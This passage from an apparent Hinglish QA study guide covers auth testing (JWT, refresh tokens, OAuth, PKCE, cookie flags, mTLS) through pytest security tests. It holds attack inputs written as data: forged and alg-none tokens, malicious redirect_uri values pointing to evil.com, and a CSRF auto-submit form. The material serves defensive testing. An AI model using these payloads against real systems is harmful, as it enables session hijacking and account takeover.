    NOTE: ye sirf tab kaam karta hai jab aapke paas staging ka signing secret ho.
    Nahi hai to real login se token lo aur uske expiry ka wait karo,
    ya backend team se short-TTL test token maango."""
    now = int(time.time())
    payload = {
        "sub": "u_123", "org": "org_44", "roles": ["SALES_MANAGER"],
        "iat": now, "nbf": now, "exp": now + exp_offset_seconds,
        "jti": str(uuid.uuid4()), "iss": "https://auth.merlinai.co", "aud": "merlin-api",
        **claims,
    }
    return pyjwt.encode(payload, secret, algorithm="HS256")


@pytest.mark.security
@pytest.mark.parametrize("offset,expected,name", [
    (3600,   200, "valid — 1 hour left"),
    (5,      200, "valid — 5 seconds left"),
    (-1,     401, "expired 1 second ago"),
    (-3600,  401, "expired 1 hour ago"),
    (-86400 * 365, 401, "expired a year ago"),
])
def test_token_expiry_enforced(offset, expected, name):
    token = make_token(offset)
    r = requests.get(f"{BASE_URL}/api/v1/sales/s_1",
                     headers={"Authorization": f"Bearer {token}"}, timeout=30)
    assert r.status_code == expected, f"{name}: got {r.status_code}"


@pytest.mark.security
def test_nbf_not_before_enforced():
    """Future mein valid hone wala token abhi accept nahi hona chahiye."""
    token = make_token(3600, nbf=int(time.time()) + 600)
    r = requests.get(f"{BASE_URL}/api/v1/sales/s_1",
                     headers={"Authorization": f"Bearer {token}"}, timeout=30)
    assert r.status_code == 401, "nbf enforce nahi ho raha"


@pytest.mark.security
def test_clock_skew_tolerance_is_bounded():
    """Servers thoda clock skew allow karte hain (usually 30-60s).
    Lekin 10 minute allow karna security hole hai."""
    r_small = requests.get(f"{BASE_URL}/api/v1/sales/s_1",
                           headers={"Authorization": f"Bearer {make_token(-10)}"}, timeout=30)
    r_big = requests.get(f"{BASE_URL}/api/v1/sales/s_1",
                         headers={"Authorization": f"Bearer {make_token(-600)}"}, timeout=30)
    assert r_big.status_code == 401, "10 minute purana expired token accept ho raha hai"
```

### Refresh tokens

**Kyun chahiye:** access token short-lived hona chahiye (5-15 min) taaki chori hone pe damage
kam ho. Lekin har 15 minute mein user ko login karwana bura UX hai. Solution: ek long-lived
**refresh token** jo sirf naye access tokens lene ke liye use hota hai.

```
Login:
  POST /auth/login  {email, password}
  -> { access_token: "eyJ..." (15 min),
       refresh_token: "rt_abc..." (30 days) }

Access token expire hone pe:
  POST /auth/refresh  {refresh_token: "rt_abc..."}
  -> { access_token: "eyJ..." (naya), refresh_token: "rt_xyz..." (rotated) }
```

**Access vs refresh token — key differences:**

| | Access token | Refresh token |
|---|---|---|
| Lifetime | 5-15 min | Days to months |
| Kahan bhejta hai | Har API request pe | Sirf `/auth/refresh` pe |
| Format | Usually JWT (self-contained) | Usually opaque random string |
| Revocable | Mushkil (stateless hai) | Aasan (DB mein stored hai) |
| Storage | Memory (ideally) | HttpOnly cookie ya secure storage |

**Refresh token rotation** — critical security test:

```python
@pytest.mark.security
def test_refresh_token_is_rotated_and_old_one_dies():
    """Har refresh pe naya refresh token milna chahiye, aur purana
    turant invalid ho jaana chahiye. Warna ek chori hua refresh token
    hamesha ke liye kaam karta rahega."""
    login = requests.post(f"{BASE_URL}/api/v1/auth/login",
                          json={"email": EMAIL, "password": PASSWORD}, timeout=30).json()
    rt1 = login["refresh_token"]

    r1 = requests.post(f"{BASE_URL}/api/v1/auth/refresh",
                       json={"refresh_token": rt1}, timeout=30)
    assert r1.status_code == 200
    rt2 = r1.json()["refresh_token"]
    assert rt2 != rt1, "Refresh token rotate nahi hua — chori hone pe permanent access"

    # Purana refresh token ab kaam nahi karna chahiye
    r2 = requests.post(f"{BASE_URL}/api/v1/auth/refresh",
                       json={"refresh_token": rt1}, timeout=30)
    assert r2.status_code == 401, "Purana refresh token abhi bhi kaam kar raha hai"


@pytest.mark.security
def test_refresh_token_reuse_detection_kills_the_family():
    """Best practice: agar ek rotated (purana) refresh token dobara use hota hai,
    server ko maan lena chahiye ki wo chori hua hai aur POORI token family
    revoke kar deni chahiye — including current valid one.
    Ye 'reuse detection' hai."""
    rt1 = login()["refresh_token"]
    rt2 = refresh(rt1)["refresh_token"]      # rt1 ab dead hai

    requests.post(f"{BASE_URL}/api/v1/auth/refresh", json={"refresh_token": rt1}, timeout=30)

    # Ab rt2 bhi dead hona chahiye
    r = requests.post(f"{BASE_URL}/api/v1/auth/refresh", json={"refresh_token": rt2}, timeout=30)
    assert r.status_code == 401, (
        "Reuse detection nahi hai — attacker aur legit user dono chalte rahenge"
    )


@pytest.mark.security
def test_access_token_cannot_be_used_as_refresh_token(valid_token):
    """Token confusion: access token ko refresh endpoint pe bhejo.
    Reject hona chahiye — token type claim check honi chahiye."""
    r = requests.post(f"{BASE_URL}/api/v1/auth/refresh",
                      json={"refresh_token": valid_token}, timeout=30)
    assert r.status_code == 401


@pytest.mark.security
def test_logout_actually_invalidates_tokens():
    """Sabse common auth bug: logout sirf client se token delete karta hai,
    server pe kuch nahi hota. Chori hua token logout ke baad bhi kaam karta hai."""
    session = login()
    access, refresh_tok = session["access_token"], session["refresh_token"]

    requests.post(f"{BASE_URL}/api/v1/auth/logout",
                  headers={"Authorization": f"Bearer {access}"},
                  json={"refresh_token": refresh_tok}, timeout=30)

    r_refresh = requests.post(f"{BASE_URL}/api/v1/auth/refresh",
                              json={"refresh_token": refresh_tok}, timeout=30)
    assert r_refresh.status_code == 401, "Logout ke baad refresh token zinda hai"

    # Access token ka behaviour design decision hai — agar stateless JWT hai to
    # expiry tak zinda rahega. Ye acceptable hai AGAR expiry chhoti ho (<15 min).
    r_access = requests.get(f"{BASE_URL}/api/v1/sales/s_1",
                            headers={"Authorization": f"Bearer {access}"}, timeout=30)
    if r_access.status_code == 200:
        exp = decode_jwt_unsafe(access)["payload"]["exp"]
        remaining = exp - time.time()
        assert remaining < 900, (
            f"Logout ke baad access token {remaining/60:.0f} min tak zinda hai — "
            "stateless JWT ke liye bhi ye bahut lamba hai"
        )
```

## 5.3 API Keys

### Kya hai

Ek long random string jo client identify karta hai. Usually header mein:

```http
X-API-Key: mk_live_7f3c1a902b444d8e9c11aa0b2f6d5e01
```

### JWT se farq

| | API Key | JWT |
|---|---|---|
| Kya identify karta hai | **Application / integration** | **User** |
| Expiry | Usually nahi (manually rotate) | Built-in `exp` |
| Content | Opaque — koi info nahi | Self-contained claims |
| Validation | DB lookup zaroori | Signature verify — DB ke bina |
| Revoke | Aasan (DB se delete) | Mushkil (stateless) |
| Kahan | Server-to-server, webhooks, partner integrations | User-facing apps |

### QA tests

```python
@pytest.mark.security
def test_api_key_scoping():
    """API key ka scope hona chahiye. Read-only key se write nahi hona chahiye."""
    r = requests.post(f"{BASE_URL}/api/v1/budgets/b_1/carve",
                      headers={"X-API-Key": READ_ONLY_KEY},
                      json={"scopeId": "sc_1", "amount": 100}, timeout=30)
    assert r.status_code == 403, "Read-only API key se write ho gaya"


@pytest.mark.security
def test_revoked_api_key_stops_working_immediately():
    """Revoke ke baad cache ki wajah se key kaam karti rah sakti hai.
    Ye ek real incident-class bug hai."""
    admin_revoke_key(TEST_KEY)
    time.sleep(2)
    r = requests.get(f"{BASE_URL}/api/v1/sales/s_1",
                     headers={"X-API-Key": TEST_KEY}, timeout=30)
    assert r.status_code == 401, "Revoked key abhi bhi kaam kar rahi hai — cache TTL issue"


@pytest.mark.security
def test_api_key_not_accepted_in_query_string():
    """Query string mein key = logs, browser history, Referer header mein leak.
    Server ko sirf header se accept karna chahiye."""
    r = requests.get(f"{BASE_URL}/api/v1/sales/s_1",
                     params={"api_key": VALID_KEY}, timeout=30)
    assert r.status_code == 401, "API key query param se accept ho rahi hai — log leak risk"


@pytest.mark.security
def test_api_key_comparison_is_constant_time():
    """Agar key comparison `==` se hota hai, timing attack se key
    character-by-character guess ho sakti hai. Median timing compare karo."""
    import statistics
    def med(key):
        ts = []
        for _ in range(40):
            t0 = time.perf_counter()
            requests.get(f"{BASE_URL}/api/v1/sales/s_1",
                         headers={"X-API-Key": key}, timeout=30)
            ts.append(time.perf_counter() - t0)
        return statistics.median(ts)

    almost = VALID_KEY[:-1] + ("a" if VALID_KEY[-1] != "a" else "b")
    totally_wrong = "x" * len(VALID_KEY)
    ratio = med(almost) / max(med(totally_wrong), 1e-9)
    assert 0.8 < ratio < 1.25, f"Timing difference {ratio:.2f}x — non-constant-time comparison"
```

## 5.4 OAuth 2.0 — flows

### Kya hai

OAuth 2.0 ek **authorization framework** hai. Ye solve karta hai: "kaise ek app ko mere data
ka access doon **bina apna password diye**".

**Chaar roles:**

| Role | Kaun | Merlin example |
|---|---|---|
| **Resource Owner** | User | Ritik |
| **Client** | Wo app jo access maang raha hai | Merlin web app / third-party integration |
| **Authorization Server** | Tokens issue karta hai | auth.merlinai.co |
| **Resource Server** | Protected API | api.merlinai.co |

**Important:** OAuth 2.0 **authorization** ke liye hai, authentication ke liye nahi. Login ke
liye **OpenID Connect (OIDC)** hai jo OAuth 2.0 ke upar ek layer hai aur ek `id_token`
(JWT) add karta hai.

### Flow 1: Authorization Code — server-side web apps ke liye

Ye sabse secure classic flow hai. **Access token kabhi browser se nahi guzarta.**

```
  User            Browser              Client App          Auth Server        API
   |                 |                     |                    |              |
   |  "Login" click  |                     |                    |              |
   |---------------->|                     |                    |              |
   |                 |  GET /login         |                    |              |
   |                 |-------------------->|                    |              |
   |                 |                     |                    |              |
   |                 |  302 -> auth server                      |              |
   |                 |  /authorize?response_type=code           |              |
   |                 |            &client_id=merlin-web         |              |
   |                 |            &redirect_uri=https://app/cb  |              |
   |                 |            &scope=sales:read             |              |
   |                 |            &state=RANDOM_CSRF_TOKEN      |              |
   |                 |<--------------------|                    |              |
   |                 |                                          |              |
   |                 |------------------------------------------>|             |
   |                 |          login page + consent screen      |              |
   |  credentials    |<------------------------------------------|             |
   |---------------->|                                          |              |
   |                 |------------------------------------------>|             |
   |                 |                                          |              |
   |                 |  302 -> https://app/cb?code=AUTH_CODE     |              |
   |                 |         &state=RANDOM_CSRF_TOKEN         |              |
   |                 |<------------------------------------------|             |
   |                 |                     |                    |              |
   |                 |  GET /cb?code=...   |                    |              |
   |                 |-------------------->|                    |              |
   |                 |                     |                    |              |
   |                 |    [state verify karo — CSRF check]      |              |
   |                 |                     |                    |              |
   |                 |                     |  POST /token       |              |
   |                 |                     |  grant_type=authorization_code    |
   |                 |                     |  code=AUTH_CODE    |              |
   |                 |                     |  client_id + client_SECRET        |
   |                 |                     |  redirect_uri      |              |
   |                 |                     |------------------->|              |
   |                 |                     |                    |              |
   |                 |                     |  {access_token, refresh_token}    |
   |                 |                     |<-------------------|              |
   |                 |                     |                    |              |
   |                 |  session cookie set |                    |              |
   |                 |<--------------------|                    |              |
   |                 |                     |                    |              |
   |                 |                     |  Authorization: Bearer <token>    |
   |                 |                     |---------------------------------->|
   |                 |                     |            data                   |
   |                 |                     |<----------------------------------|
```

**Kyun do steps (code phir token):** authorization code browser ke through jaata hai (URL
mein dikhta hai, history mein rehta hai, `Referer` mein leak ho sakta hai). Lekin code akela
useless hai — usko token mein exchange karne ke liye **client_secret** chahiye jo sirf
server ke paas hai.

**QA yahan kya test karta hai:**

```python
@pytest.mark.security
def test_authorization_code_is_single_use(auth_code):
    """Code ek hi baar exchange hona chahiye. Dobara use karne pe
    server ko us code se issue kiye gaye SAARE tokens revoke kar dene chahiye."""
    r1 = requests.post(f"{AUTH_URL}/token", data={
        "grant_type": "authorization_code", "code": auth_code,
        "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET,
        "redirect_uri": REDIRECT_URI}, timeout=30)
    assert r1.status_code == 200

    r2 = requests.post(f"{AUTH_URL}/token", data={
        "grant_type": "authorization_code", "code": auth_code,
        "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET,
        "redirect_uri": REDIRECT_URI}, timeout=30)
    assert r2.status_code == 400, "Authorization code dobara use ho gaya"


@pytest.mark.security
def test_redirect_uri_must_match_exactly(auth_code):
    """redirect_uri exact match hona chahiye — prefix/substring match nahi.
    Agar attacker apna redirect_uri de sake, wo code chura lega."""
    for evil in ["https://evil.example.com/cb",
                 REDIRECT_URI + ".evil.com",
                 REDIRECT_URI + "/../../evil",
                 REDIRECT_URI + "?next=https://evil.com"]:
        r = requests.post(f"{AUTH_URL}/token", data={
            "grant_type": "authorization_code", "code": auth_code,
            "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET,
            "redirect_uri": evil}, timeout=30)
        assert r.status_code == 400, f"redirect_uri '{evil}' accept ho gaya — code theft possible"


@pytest.mark.security
def test_state_parameter_is_required_and_verified():
    """state CSRF protection hai. Agar client isko verify nahi karta,
    attacker victim ke account mein apna account link kar sakta hai
    (login CSRF / account takeover)."""
    r = requests.get(f"{APP_URL}/auth/callback",
                     params={"code": "some_code"},   # state missing
                     allow_redirects=False, timeout=30)
    assert r.status_code >= 400, "state ke bina callback accept ho gaya — CSRF possible"


@pytest.mark.security
def test_authorization_code_expires_quickly(auth_code):
    """Code ki lifetime 10 minute se kam honi chahiye (spec recommends <=10 min,
    ideally under 1 minute)."""
    time.sleep(600)
    r = requests.post(f"{AUTH_URL}/token", data={
        "grant_type": "authorization_code", "code": auth_code,
        "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET,
        "redirect_uri": REDIRECT_URI}, timeout=30)
    assert r.status_code == 400, "10 minute purana code abhi bhi valid hai"
```

### Flow 2: Client Credentials — machine-to-machine

Koi user hi nahi hai. Ek service doosri service se baat kar rahi hai.

```
   Service A                          Auth Server                Resource Server
       |                                   |                            |
       |  POST /token                      |                            |
       |  grant_type=client_credentials    |                            |
       |  client_id=merlin-batch-job       |                            |
       |  client_secret=<secret>           |                            |
       |  scope=budgets:read budgets:write |                            |
       |---------------------------------->|                            |
       |                                   |                            |
       |  { access_token, expires_in }     |                            |
       |<----------------------------------|                            |
       |                                   |                            |
       |  Authorization: Bearer <token>                                 |
       |--------------------------------------------------------------->|
       |                                   |         data               |
       |<---------------------------------------------------------------|
```

Simplest flow — koi redirect nahi, koi user consent nahi, koi refresh token nahi (secret hai
to naya token le lo).

**QA kya test kare:**

```python
@pytest.mark.security
def test_client_credentials_scope_is_enforced():
    """Token ke scope se zyada kuch nahi kar paana chahiye."""
    token = get_client_credentials_token(scope="budgets:read")
    r = requests.post(f"{BASE_URL}/api/v1/budgets/b_1/carve",
                      headers={"Authorization": f"Bearer {token}"},
                      json={"scopeId": "sc_1", "amount": 100}, timeout=30)
    assert r.status_code == 403, "read-only scope se write ho gaya"


@pytest.mark.security
def test_client_cannot_request_scopes_it_was_not_granted():
    """Client apne registered scopes se zyada nahi maang sakta.
    Server ko ya reject karna chahiye, ya scope down-grade karke dena chahiye."""
    r = requests.post(f"{AUTH_URL}/token", data={
        "grant_type": "client_credentials",
        "client_id": READONLY_CLIENT_ID, "client_secret": READONLY_CLIENT_SECRET,
        "scope": "budgets:write admin:all"}, timeout=30)
    if r.status_code == 200:
        granted = set(r.json()["scope"].split())
        assert "admin:all" not in granted and "budgets:write" not in granted, \
            "Client ne apne registered scopes se zyada maang liya aur mil gaya"


@pytest.mark.security
def test_m2m_token_has_no_user_identity():
    """Client credentials token mein 'sub' user ka nahi hona chahiye.
    Agar hai, to service account kisi user ki tarah act kar sakta hai —
    aur audit logs galat ho jayenge."""
    token = get_client_credentials_token(scope="budgets:read")
    payload = decode_jwt_unsafe(token)["payload"]
    assert payload.get("sub", "").startswith(("svc_", "client_")) or "client_id" in payload, \
        f"M2M token mein user-like sub hai: {payload.get('sub')}"
```

### Flow 3: PKCE — public clients (SPA, mobile)

**Problem:** SPA aur mobile apps **client_secret store nahi kar sakte**. JavaScript bundle
mein secret dalna = secret public hai. Mobile app decompile ho sakta hai.

Bina secret ke, agar attacker authorization code chura le (mobile pe malicious app custom
URL scheme register kar sakta hai), wo turant token le lega.

**Solution: PKCE** (Proof Key for Code Exchange, "pixy" bolte hain).

Client har baar ek random secret **generate karta hai on the fly**:

```
1. code_verifier  = random 43-128 char string (har login pe naya)
2. code_challenge = base64url(SHA256(code_verifier))

3. /authorize request mein code_challenge bheja jaata hai (public, browser ke through)
4. /token request mein code_verifier bheja jaata hai (secret, direct call)
5. Auth server SHA256(code_verifier) compare karta hai stored code_challenge se
```

```
   Mobile App                     Browser/System                  Auth Server
       |                               |                                |
       |  verifier = random(64)        |                                |
       |  challenge = S256(verifier)   |                                |
       |                               |                                |
       |  open /authorize?             |                                |
       |    response_type=code         |                                |
       |    client_id=merlin-mobile    |                                |
       |    code_challenge=<challenge> |                                |
       |    code_challenge_method=S256 |                                |
       |    state=<random>             |                                |
       |------------------------------>|------------------------------->|
       |                               |                                |
       |                               |  user logs in + consents       |
       |                               |<------------------------------>|
       |                               |                                |
       |                               |  redirect app://cb?code=CODE   |
       |<------------------------------|<-------------------------------|
       |                                                                |
       |  POST /token                                                   |
       |    grant_type=authorization_code                               |
       |    code=CODE                                                   |
       |    code_verifier=<verifier>       <- ORIGINAL secret            |
       |    client_id=merlin-mobile        <- koi client_secret NAHI     |
       |--------------------------------------------------------------->|
       |                                                                |
       |                     server: SHA256(verifier) == challenge?     |
       |                     haan -> tokens de do                       |
       |                     nahi -> 400 invalid_grant                  |
       |  { access_token, refresh_token }                               |
       |<---------------------------------------------------------------|
```

**Attacker ne agar code chura bhi liya**, uske paas `code_verifier` nahi hai — aur wo
`code_challenge` se derive nahi ho sakta (SHA256 one-way hai). Code useless hai.

```python
import hashlib, base64, secrets

def make_pkce_pair():
    verifier = base64.urlsafe_b64encode(secrets.token_bytes(48)).decode().rstrip("=")
    challenge = base64.urlsafe_b64encode(
        hashlib.sha256(verifier.encode()).digest()).decode().rstrip("=")
    return verifier, challenge


@pytest.mark.security
def test_pkce_wrong_verifier_rejected():
    """Ye PKCE ka core test hai — galat verifier se code exchange nahi hona chahiye."""
    verifier, challenge = make_pkce_pair()
    code = do_authorize_and_get_code(code_challenge=challenge, method="S256")

    wrong_verifier, _ = make_pkce_pair()
    r = requests.post(f"{AUTH_URL}/token", data={
        "grant_type": "authorization_code", "code": code,
        "client_id": PUBLIC_CLIENT_ID, "redirect_uri": REDIRECT_URI,
        "code_verifier": wrong_verifier}, timeout=30)
    assert r.status_code == 400, "Galat code_verifier se token mil gaya — PKCE useless hai"


@pytest.mark.security
def test_pkce_is_mandatory_for_public_clients():
    """Sabse important PKCE test: kya PKCE ko SKIP kiya ja sakta hai?
    Agar client bina code_challenge ke authorize kar sakta hai,
    to attacker bhi kar sakta hai — poori protection bypass."""
    code = do_authorize_and_get_code(code_challenge=None)
    r = requests.post(f"{AUTH_URL}/token", data={
        "grant_type": "authorization_code", "code": code,
        "client_id": PUBLIC_CLIENT_ID, "redirect_uri": REDIRECT_URI}, timeout=30)
    assert r.status_code == 400, "Public client bina PKCE ke token le sakta hai"


@pytest.mark.security
def test_plain_challenge_method_rejected():
    """code_challenge_method=plain ka matlab challenge == verifier —
    matlab koi protection nahi. S256 mandatory hona chahiye."""
    verifier, _ = make_pkce_pair()
    code = do_authorize_and_get_code(code_challenge=verifier, method="plain")
    r = requests.post(f"{AUTH_URL}/token", data={
        "grant_type": "authorization_code", "code": code,
        "client_id": PUBLIC_CLIENT_ID, "redirect_uri": REDIRECT_URI,
        "code_verifier": verifier}, timeout=30)
    assert r.status_code == 400, "method=plain accept ho raha hai — PKCE downgrade attack"
```

### Deprecated flows — inhe jaanna zaroori hai (interview mein poochte hain)

| Flow | Kyun deprecated |
|---|---|
| **Implicit** (`response_type=token`) | Access token **URL fragment mein** aata hai — browser history, logs, `Referer` mein leak. Refresh token bhi nahi mil sakta. **Ab Authorization Code + PKCE use karo.** |
| **Resource Owner Password Credentials** (ROPC) | App user ka password directly maangti hai — ye poora OAuth ka point hi khatam kar deta hai. MFA support nahi. SSO nahi. Sirf ultra-legacy migration ke liye. |

```python
@pytest.mark.security
def test_implicit_and_password_grants_are_disabled():
    """Deprecated grants disabled hone chahiye — warna attacker
    modern protections ko downgrade karke bypass kar sakta hai."""
    r_implicit = requests.get(f"{AUTH_URL}/authorize", params={
        "response_type": "token", "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI}, allow_redirects=False, timeout=30)
    assert r_implicit.status_code >= 400 or "error" in r_implicit.headers.get("Location", ""), \
        "Implicit flow enabled hai — token URL fragment mein leak hoga"

    r_ropc = requests.post(f"{AUTH_URL}/token", data={
        "grant_type": "password", "username": EMAIL, "password": PASSWORD,
        "client_id": CLIENT_ID}, timeout=30)
    assert r_ropc.status_code == 400, "Password grant enabled hai — MFA bypass possible"
```

## 5.5 Session cookies

### Kya hai

Server session banata hai, session id cookie mein bhejta hai. Browser automatically har
request pe wo cookie bhejta hai.

```http
Set-Cookie: session=abc123xyz; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
```

### Flags — teeno zaroori hain

| Flag | Kya karta hai | Na hone pe kya hota hai |
|---|---|---|
| **HttpOnly** | JavaScript cookie padh nahi sakta (`document.cookie`) | XSS se session chori — attacker ka script token bhej deta hai |
| **Secure** | Sirf HTTPS pe bheja jaata hai | HTTP pe plaintext travel — network sniffing se chori |
| **SameSite** | Cross-site requests pe cookie kab bhejni hai | **CSRF** |
| **Path** | Kaunse paths pe bhejni hai | Scope zyada bada |
| **Domain** | Kaunse domains pe | `Domain=.merlinai.co` = saare subdomains — ek compromised subdomain sab kuch le sakta hai |
| **Max-Age/Expires** | Kab tak valid | Session kabhi expire nahi hoti |

### SameSite ke teen values

| Value | Behaviour |
|---|---|
| `Strict` | Cross-site request pe cookie **kabhi nahi** jaati. Sabse secure. Problem: external link se aane pe user logged out dikhta hai |
| `Lax` | **Top-level GET navigation** pe jaati hai (link click), lekin POST/iframe/img/fetch pe nahi. Modern browsers ka default |
| `None` | Har cross-site request pe jaati hai. **`Secure` ke bina invalid hai** |

**Ye CSRF ko kaise rokta hai:**

```
Attacker ki site pe:
  <form action="https://app.merlinai.co/api/v1/sales/s_1/close" method="POST">
  <script>document.forms[0].submit()</script>

SameSite=None  -> cookie jaati hai -> sale close ho gayi. CSRF successful.
SameSite=Lax   -> POST hai, cookie NAHI jaati -> 401. CSRF blocked.
SameSite=Strict-> cookie NAHI jaati -> blocked.
```

> **[REAL]** Merlin ka JWT ek **cookie se** aata hai. Iska matlab ye saare cookie flag tests
> directly applicable hain — aur ye ek achha test set hai jo main automate kar sakta hoon.

```python
def parse_set_cookie(response, name):
    """Set-Cookie header ko parse karke attributes nikalo."""
    for raw in response.raw.headers.getlist("Set-Cookie"):
        if raw.startswith(f"{name}="):
            parts = [p.strip() for p in raw.split(";")]
            attrs = {}
            for p in parts[1:]:
                if "=" in p:
                    k, v = p.split("=", 1)
                    attrs[k.lower()] = v
                else:
                    attrs[p.lower()] = True
            return attrs
    return None


@pytest.mark.security
def test_auth_cookie_has_all_security_flags():
    """[REAL — Merlin ka JWT cookie se aata hai]
    Teeno flags mandatory hain. Ye test 5 minute mein likhta hai
    aur real findings deta hai."""
    r = requests.post(f"{BASE_URL}/api/v1/auth/login",
                      json={"email": EMAIL, "password": PASSWORD}, timeout=30)
    attrs = parse_set_cookie(r, "token")
    assert attrs, "Auth cookie set hi nahi hui"

    assert attrs.get("httponly"), (
        "HttpOnly missing — XSS se JWT chori ho sakta hai, "
        "aur JWT mein org + roles hain"
    )
    assert attrs.get("secure"), "Secure missing — HTTP pe cookie plaintext jayegi"
    assert attrs.get("samesite", "").lower() in ("lax", "strict"), (
        f"SameSite={attrs.get('samesite')} — CSRF protection weak hai"
    )
    assert attrs.get("path") == "/", f"Path={attrs.get('path')}"

    # Domain scope check — subdomain wildcard risky hai
    domain = attrs.get("domain", "")
    assert not domain.startswith("."), (
        f"Domain={domain} — saare subdomains pe cookie jayegi. "
        "Ek compromised subdomain poora session le sakta hai"
    )


@pytest.mark.security
def test_session_cookie_regenerated_on_login():
    """Session fixation attack: attacker victim ko apni session id de deta hai,
    victim login karta hai, aur attacker ke paas ab authenticated session hai.
    Fix: login pe NAYI session id generate karo."""
    s = requests.Session()
    s.get(f"{BASE_URL}/api/v1/auth/csrf", timeout=30)     # pre-login session
    before = s.cookies.get("session")

    s.post(f"{BASE_URL}/api/v1/auth/login",
           json={"email": EMAIL, "password": PASSWORD}, timeout=30)
    after = s.cookies.get("session")

    assert before != after, "Login pe session id regenerate nahi hui — session fixation possible"


@pytest.mark.security
def test_logout_clears_cookie_properly():
    s = requests.Session()
    s.post(f"{BASE_URL}/api/v1/auth/login",
           json={"email": EMAIL, "password": PASSWORD}, timeout=30)
    r = s.post(f"{BASE_URL}/api/v1/auth/logout", timeout=30)

    # Server ko cookie expire karni chahiye, sirf client pe bharosa nahi
    assert "Set-Cookie" in r.headers
    assert "Max-Age=0" in r.headers["Set-Cookie"] or "1970" in r.headers["Set-Cookie"], \
        "Logout ne cookie expire nahi ki"
```

## 5.6 mTLS — mutual TLS

### Kya hai

Normal TLS mein sirf **server** apna certificate dikhata hai — client verify karta hai ki
"ye sach mein merlinai.co hai".

mTLS mein **dono** certificate dikhate hain. Server bhi verify karta hai ki client kaun hai.

```
Normal TLS:                          mTLS:
  Client -> "kaun ho?"                 Client -> "kaun ho?"
  Server -> cert                       Server -> cert
  Client verifies                      Client verifies
  [done]                               Server -> "tum kaun ho?"
                                       Client -> client cert
                                       Server verifies
                                       [done]
```

### Kab use hota hai

- Service-to-service inside a mesh (Istio/Linkerd automatically karte hain)
- Bank/payment partner integrations
- IoT devices
- Zero-trust networks

**Fayda:** authentication **transport layer pe** ho jaati hai, application layer se pehle. Ek
attacker jiske paas valid client cert nahi hai, wo application tak pahunch hi nahi sakta.

```python
def test_mtls_endpoint_requires_client_cert():
    """Bina client cert ke connection level pe hi fail hona chahiye."""
    with pytest.raises((requests.exceptions.SSLError, requests.exceptions.ConnectionError)):
        requests.get("https://partner-api.merlinai.co/api/v1/settlements", timeout=30)


def test_mtls_with_valid_cert_succeeds():
    r = requests.get("https://partner-api.merlinai.co/api/v1/settlements",
                     cert=("certs/client.crt", "certs/client.key"),
                     verify="certs/ca.pem", timeout=30)
    assert r.status_code == 200


def test_mtls_expired_cert_rejected():
    with pytest.raises(requests.exceptions.SSLError):
        requests.get("https://partner-api.merlinai.co/api/v1/settlements",
                     cert=("certs/expired.crt", "certs/expired.key"),
                     verify="certs/ca.pem", timeout=30)
```

## 5.7 Auth test-case checklist — 20 cases

Ye poora checklist interview mein bol dena aapko turant alag kar deta hai.

| # | Test case | Expected | Kya pakadta hai |
|---|---|---|---|
| 1 | Koi `Authorization` header nahi | 401 + `WWW-Authenticate` | Endpoint accidentally public |
| 2 | Empty token (`Bearer `) | 401 | Auth filter mein null handling |
| 3 | Malformed token (random string) | 401, **not 500** | Unhandled exception in auth path |
| 4 | Expired token | 401 | `exp` validation missing |
| 5 | Token with tampered payload (roles → ADMIN) | 401 | Signature verification skip |
| 6 | Token signed with wrong secret | 401 | Signature verification skip |
| 7 | `alg: none` token | 401 | Classic JWT library bug |
| 8 | RS256 → HS256 algorithm confusion | 401 | `alg` header trusted from input |
| 9 | Token from a **different environment** (dev token on staging) | 401 | `iss`/`aud` not validated — shared secrets across envs |
| 10 | Token from a **different audience** | 401 | `aud` validation missing |
| 11 | Valid token, **wrong role** for the action | 403 | Missing authorization check |
| 12 | Valid token, **another org's resource** | **404** (not 403) | Tenant isolation + existence leak |
| 13 | Org id overridden via header / body / query | Ignored | Mass assignment / tenant bypass |
| 14 | Another user's resource, same org (IDOR) | 403 or 404 | Object-level authorization |
| 15 | Token replay after logout | 401 (refresh), short-lived (access) | Server-side revocation |
| 16 | Refresh token rotation + old token reuse | 401 + family revoked | Reuse detection |
| 17 | Auth cookie flags: HttpOnly, Secure, SameSite | All present | XSS/CSRF exposure |
| 18 | Session id regenerated on login | New id | Session fixation |
| 19 | Brute force: 50 wrong logins | 429 or 423 | Credential stuffing protection |
| 20 | User info in error messages / timing differences | No difference | User enumeration |

```python
# Ye checklist ek reusable parametrized suite ban sakta hai
# jise HAR endpoint pe chalaya ja sakta hai

PROTECTED_ENDPOINTS = [
    ("GET",  "/api/v1/projects/{project_id}/sales"),
    ("GET",  "/api/v1/sales/{sale_id}/spine"),
    ("POST", "/api/v1/budgets/{budget_id}/carve"),
    ("POST", "/api/v1/budgets/{budget_id}/convert-to-offer"),
    ("GET",  "/api/v1/budgets/{budget_id}/coverage"),
    ("POST", "/api/v1/sales/{sale_id}/close"),
]

BAD_TOKENS = [
    (None,                              "no header"),
    ("",                                "empty bearer"),
    ("not-a-jwt",                       "garbage"),
    ("a.b.c",                           "three junk parts"),
    (lambda: make_token(-3600),         "expired"),
    (lambda: make_token(3600, secret="wrong-secret"), "wrong signature"),
    (lambda: make_alg_none_token(),     "alg none"),
    (lambda: make_token(3600, aud="other-api"), "wrong audience"),
    (lambda: make_token(3600, iss="https://evil.com"), "wrong issuer"),
]


@pytest.mark.security
@pytest.mark.parametrize("method,path", PROTECTED_ENDPOINTS)
@pytest.mark.parametrize("token,name", BAD_TOKENS)
def test_all_endpoints_reject_bad_tokens(api_raw, method, path, token, name, ids):
    """6 endpoints x 9 bad tokens = 54 security tests, ek matrix se.
    Ye har naye endpoint ke liye automatically chal jaayega —
    bas PROTECTED_ENDPOINTS mein ek line add karo."""
    tok = token() if callable(token) else token
    headers = {} if tok is None else {"Authorization": f"Bearer {tok}"}

    r = requests.request(method, BASE_URL + path.format(**ids),
                         headers=headers, json={}, timeout=30)

    assert r.status_code == 401, f"{method} {path} with {name}: got {r.status_code}"
    assert r.status_code != 500, f"{method} {path} with {name}: 500 in auth path"
    # Aur error mein internal detail nahi honi chahiye
    assert "Exception" not in r.text and "at com." not in r.text
```

> **Interview answer (auth testing):**
>
> "I separate the two concerns deliberately, because they fail differently. Authentication —
> who are you — is centralised: it's one filter, and once it's right, it's right for every
> endpoint. Authorization — what may you do — is distributed across every controller method,
